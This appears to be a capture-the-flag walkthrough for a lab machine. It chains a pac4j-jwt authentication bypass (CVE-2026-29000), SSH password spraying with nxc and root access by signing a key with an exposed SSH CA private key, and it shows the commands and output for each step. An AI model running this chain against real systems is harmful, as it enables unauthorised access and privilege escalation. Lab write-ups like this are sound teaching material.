Two services are exposed:

Let's check the website running on port 8080.

We have a version detection in our scan - 'pac4j-jwt/6.0.3'

A known vulnerability exists for this version. - CVE-2026-29000 ( pac4j-jwt Authentication Bypass)

CVE-2026-29000 is a critical authentication bypass vulnerability affecting the pac4j-jwt authentication library. The flaw occurs when the JwtAuthenticator improperly validates encrypted JWT (JWE) tokens, allowing an attacker to craft a malicious token that bypasses signature verification and impersonates arbitrary users.

Here is the exploit: [text](exploit.py)

```bash
 python3 exploitt.py http://10.129.244.220:8080
[*] Fetching JWKS...
[+] Got RSA public key (kid: enc-key-1)
[*] Crafted PlainJWT with admin privileges
[+] Forged JWE token created

[*] Accessing /api/dashboard...
[+] Status: 200
[+] Authenticated as: admin (ROLE_ADMIN)
[+] Token: eyJhbGciOi..............4wYSHsoH5XVu9aYiXw
```
Now open the browser developer tools and add the generated token to session storage using the key `auth_token`.

In the dashboard check the users and settings endpoint. We can find few usernames from users endpoint and There is a couple of interesting findings from security endpoint.
Firstly, we found an encryption key which can be used for ssh and we found some information which will be useful for privilege escalation.

Let's see if password spraying works
Using the credentials discovered from the application, we perform password spraying against the SSH service.

```bash
nxc ssh <Machine_IP> -u user.txt -p 'D3p.....2!'
SSH         10.129.244.220  22     10.129.244.220   [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14

```
Let's login via ssh

```bash
ssh svc-deploy@<Machine_IP>
svc-deploy@10.129.244.220's password:

svc-deploy@principal:~$ 
```
We can find user flag from here. 

## Privilege Escalation

![alt text](images/ssh-foothold.png)

Let's inspect the discovered directory.

```bash
svc-deploy@principal:/opt/principal/ssh$ ls
README.txt  ca  ca.pub
svc-deploy@principal:/opt/principal/ssh$ cat README.txt 
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
```
The configuration specifies TrustedUserCAKeys, which means SSH trusts certificates signed by this CA. However, no AuthorizedPrincipalsFile is configured, allowing any certificate signed by the CA to authenticate as any user specified in the certificate principal.

Let's try to find out more about this. So let's have a look at configuration file for ssh

```bash
svc-deploy@principal:/opt/principal/ssh$ cat /etc/ssh/sshd_config.d/60-principal.conf 
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```
We cannot login to root via using password.
Since the CA file is trusted we can forge a new ssh key pair with root signature.

Let's generate a new key 

```bash
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -t rsa -b 4096 -f /tmp/root_key -N ""
Generating public/private rsa key pair.
Your identification has been saved in /tmp/root_key
Your public key has been saved in /tmp/root_key.pub
The key fingerprint is:
SHA256:wVrlMyB7Puyo0bm6ZEv6F8jhpoHthU139qkbgULw4nk svc-deploy@principal
The key's randomart image is:
+---[RSA 4096]----+
|  .   . . .      |
|   o   + +       |
|  . o . = +      |
| . +o .Bo. o     |
| oo*E+ooS. .     |
|. +.Bo.+ oo      |
| . == +.o.       |
|  o= +....       |
|  ..*+. ..       |
+----[SHA256]-----+
```

Now sign the public key with the compromised CA private key while setting root as the principal, allowing us to authenticate as root via SSH.

```bash
ssh-keygen -s /opt/principal/ssh/ca -I "root" -n root -V +1h /tmp/root_key.pub

Signed user key /tmp/root_key-cert.pub: id "root" serial 0 for root valid from 2026-03-13T14:21:00 to 2026-03-13T15:22:41
```

Now use the ssh key to login as root

```bash
svc-deploy@principal:/opt/principal/ssh$ ssh -i /tmp/root_key root@localhost
